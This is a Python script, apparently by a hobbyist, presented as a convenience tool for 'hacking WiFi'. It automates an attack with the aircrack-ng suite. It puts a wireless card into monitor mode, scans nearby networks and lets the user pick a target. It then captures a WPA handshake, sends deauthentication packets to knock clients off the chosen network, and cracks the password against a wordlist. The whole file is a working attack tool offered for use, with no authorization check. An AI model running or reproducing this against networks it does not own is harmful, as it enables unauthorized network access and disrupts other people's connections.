#!/usr/bin/python3
'''

This tool is for your convenience in hacking WiFi

'''

import subprocess
import time
import sys
import csv
import os

print('''
       Welcome
----------------------      
[1] Wireless Hacking
[9] About Me
----------------------      
''')

while True:
    try:
        user_input = int(input('Enter Number Choice : '))
        print()
        if user_input in (1, 9):
            break
        else:
            print('The number must be 1 or 9')
    except ValueError:
        print('Please enter just number')


wordlist = 'pass.txt'
if not os.path.exists(wordlist):
    print('pass.txt file not found')
    exit()

def get_wifi_interface():
    result = subprocess.run(['iwconfig'],capture_output=True, text=True)
    for line in result.stdout.splitlines():
        if 'IEEE 802.11' in line:
            return line.split()[0]
iface = get_wifi_interface()
if iface is None:
    print('No wireless interface found')
    exit()

def Wireless(iface,user_input):
    if user_input == 1:
        def monitor(iface):
            try:
                subprocess.run(['sudo','airmon-ng','start', iface], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                subprocess.run(['sudo','airmon-ng','check','kill'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            except Exception as e:
                print(f'{iface} did not go into monitoring mode')
                return None
            else:
                time.sleep(1)
                new_iface = get_wifi_interface()
                print(f'Wireless Card :[{new_iface}] Went into monitoring mode')
                return new_iface

        iface = monitor(iface)
        if iface is None:
            print('Failed to enter monitor mode')
            exit()

        while True:
            try:
                second_scan = int(input('How many seconds do you want to scan?(second): '))
                print('<------------------------------------------------->')
                break
            except ValueError:
                print('Please enter Just number')

        def scan_wifi(iface):
            dump_file = 'wifi_scan'
            try:
                print()
                print('[1]Scanning WiFi...')
                proc = subprocess.Popen(['sudo','airodump-ng','-w',dump_file,'--output-format','csv',iface],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
                time.sleep(second_scan)
                proc.terminate()
                proc.wait()
            except Exception as e:
                print('Error running airodump:', e)
                return []
            
            csv_file = dump_file + '-01.csv'
            wifi_list = []
            if os.path.exists(csv_file):
                with open(csv_file, newline='') as f:
                    reader = csv.reader(f)
                    networks = False
                    for row in reader:
                        if len(row) == 0:
                            networks = True
                            continue
                        if networks and len(row) > 13:
                            bssid = row[0].strip()
                            ch    = row[3].strip()  
                            ssid  = row[13].strip()
                            if ssid != '':
                                wifi_list.append((ssid,bssid,ch))
            return wifi_list
#ALIGhasemi
        def select_wifi(wifi_list):
            print('\nList of WiFi Networks:\n')
            for i,(ssid,bssid,ch) in enumerate(wifi_list,start=1):
                print(f'[{i}] SSID: {ssid}   BSSID: {bssid}   CH: {ch}')
            while True:
                try:
                    choice = int(input('\nEnter number of WiFi: '))
                    if 1 <= choice <= len(wifi_list):
                        break
                    else:
                        print(f'Please enter a number between 1 and {len(wifi_list)}')
                except ValueError:
                    print('Please enter just number')

            ssid, bssid, ch = wifi_list[choice-1]

            print(f'\nSelected: {ssid} ({bssid}) on Channel {ch}\n')
            return bssid, ch
        
        wifi_list = scan_wifi(iface)
        if wifi_list:
            output_file     = 'handshake'
            target_bssid, target_channel = select_wifi(wifi_list)
            print('Your selected BSSID:', target_bssid)
            print('Channel:', target_channel)

            def hack(iface,target_channel,target_bssid):
                try:
                    print()
                    print('[2]Getting a handshake ...')
                    hack_bssid  = subprocess.Popen(['sudo', 'airodump-ng', '--bssid', target_bssid, '--channel', str(target_channel),'--write', output_file, iface],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
                    time.sleep(26)
                except:
                    print(f"can't Scan Target WIFI({target_bssid})")
                else:
                    subprocess.run(['sudo', 'aireplay-ng', '--deauth', str(20), '-a', target_bssid, iface],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
                    time.sleep(3)

            def crack(wordlist,output_file):
                try:
                    subprocess.run(['sudo', 'aircrack-ng', output_file + '-01.cap', '-w', wordlist])
                    print()
                except:
                    print('Cannot crack handshake')

            hack(iface,target_channel,target_bssid)
            time.sleep(2)
            crack(wordlist,output_file)
            time.sleep(2)
            reset_network(iface)
        else:
            print('No WiFi networks found')
        
    elif user_input == 9:
        text = 'This program was created by ALIGhasemi'
        width = 56
        print('┏' + '━'*width + '┓')
        print('┃' + text.center(width) + '┃')
        print('┗' + '━'*width + '┛')

def reset_network(iface):
    try:
        subprocess.run(['sudo','airmon-ng','stop', iface],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
        subprocess.run(['sudo','systemctl','restart','NetworkManager'],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
    except:
        print('Please reboot device (canot restart networkmanager)')
    else:
        print('Restart Networkmanager.')

def clean():
    input_remove = input('Do you want remove files ? (Y/N)')
    if input_remove.upper() == 'Y':
        temp_files   = [
            'wifi_scan-01.csv',
            'handshake-01.cap',
            'handshake-01.kismet.csv',
            'handshake-01.kismet.netxml',
            'handshake-01.log.csv',
            'handshake-01.csv'
        ]
        for file in temp_files:
            if os.path.exists(file):
                try:
                    os.remove(file)
                except Exception as e:
                    print(f'Cannot remove {file}: {e}')
    elif input_remove.upper() == 'N':
        print('dosent remove')
        sys.exit()

try:
    Wireless(iface, user_input)
except KeyboardInterrupt:
    print('\nProgram interrupted by user')
finally:
    reset_network(iface)
    clean()
    sys.exit()
